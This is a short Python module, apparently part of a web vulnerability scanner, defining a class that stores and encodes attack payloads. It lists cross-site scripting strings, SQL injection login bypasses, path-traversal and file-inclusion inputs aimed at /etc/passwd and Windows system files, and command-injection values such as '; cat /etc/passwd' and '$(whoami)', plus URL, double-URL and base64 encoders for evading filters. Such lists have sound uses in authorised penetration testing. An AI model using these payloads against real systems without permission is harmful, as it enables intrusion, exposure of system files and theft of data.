"""
Payload Generator for vulnerability testing
"""

import base64
import urllib.parse

class PayloadGenerator:
    """
    Generate various payloads for vulnerability testing
    """
    
    def __init__(self):
        self.xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "<svg/onload=alert(1)>",
            "javascript:alert(1)",
            "<iframe src=javascript:alert(1)>",
            "'><script>alert(1)</script>",
            '"><script>alert(1)</script>',
            "<body onload=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<select onfocus=alert(1) autofocus>"
        ]
        
        self.sqli_payloads = [
            "'",
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' OR 1=1 --",
            "1' AND '1'='2",
            "' UNION SELECT NULL--",
            "' AND 1=2 UNION SELECT 1,2,3--"
        ]
        
        self.lfi_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd",
            "..%252f..%252f..%252fetc%252fpasswd",
            "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
            "file:///etc/passwd",
            "php://filter/convert.base64-encode/resource=index.php",
            "/var/log/apache2/access.log",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "..\\..\\..\\..\\..\\..\\..\\..\\windows\\win.ini"
        ]
        
        self.cmd_injection_payloads = [
            "; ls -la",
            "| ls -la",
            "& dir",
            "; whoami",
            "| whoami",
            "& whoami",
            "`whoami`",
            "$(whoami)",
            "; cat /etc/passwd",
            "& type C:\\Windows\\win.ini"
        ]
        
    def get_xss_payloads(self):
        """Get XSS payloads"""
        return self.xss_payloads
        
    def get_sqli_payloads(self):
        """Get SQL injection payloads"""
        return self.sqli_payloads
        
    def get_lfi_payloads(self):
        """Get Local File Inclusion payloads"""
        return self.lfi_payloads
        
    def get_cmd_injection_payloads(self):
        """Get command injection payloads"""
        return self.cmd_injection_payloads
        
    def encode_payload(self, payload, encoding="url"):
        """Encode payload in various formats"""
        if encoding == "url":
            return urllib.parse.quote(payload)
        elif encoding == "double_url":
            return urllib.parse.quote(urllib.parse.quote(payload))
        elif encoding == "base64":
            return base64.b64encode(payload.encode()).decode()
        elif encoding == "html":
            return payload.replace("<", "&lt;").replace(">", "&gt;")
        else:
            return payload
